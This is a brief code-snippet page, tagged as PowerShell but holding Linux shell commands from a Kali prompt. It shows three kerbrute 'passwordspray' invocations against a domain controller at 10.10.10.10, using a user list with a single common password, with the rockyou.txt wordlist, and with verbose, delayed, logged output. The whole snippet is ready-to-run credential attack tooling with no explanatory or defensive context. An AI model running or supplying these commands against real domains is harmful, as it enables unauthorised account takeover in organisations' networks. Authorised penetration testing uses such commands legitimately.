---
id: 568faf6d-e79c-4ea3-9f8f-2523e37536f4
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:04.255451+00:00'
updated_at: '2023-04-10T20:36:09.932299+00:00'
---

# Code Snippet 568faf6d

**Language**: Powershell

```powershell
root@kali:~$ ./kerbrute_linux_amd64 passwordspray -d domain.local --dc 10.10.10.10 domain_users.txt Password123
root@kali:~$ ./kerbrute_linux_amd64 passwordspray -d domain.local --dc 10.10.10.10 domain_users.txt rockyou.txt
root@kali:~$ ./kerbrute_linux_amd64 passwordspray -d domain.local --dc 10.10.10.10 domain_users.txt '123456' -v --delay 100 -o kerbrute-passwordspray-123456.log
```


